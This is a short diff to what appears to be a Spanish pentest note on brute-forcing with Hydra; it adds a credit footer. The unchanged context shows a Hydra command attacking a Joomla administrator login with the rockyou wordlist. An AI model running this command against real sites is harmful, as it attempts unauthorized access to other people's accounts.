@@ -90,3 +90,10 @@ Fuerza bruta con Hydra
 hydra -l <username> -P /usr/share/wordlists/rockyou.txt <url> http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login:F=Incorrect username or password."
 ```
 
+
+----
+
+
+<div style="text-align:center; font-size: 0.9em; margint-top: 40px; color: #33ff33;">
+    💻 Hecho con 💚 por <strong>Marcela</strong> - 2025
+</div>
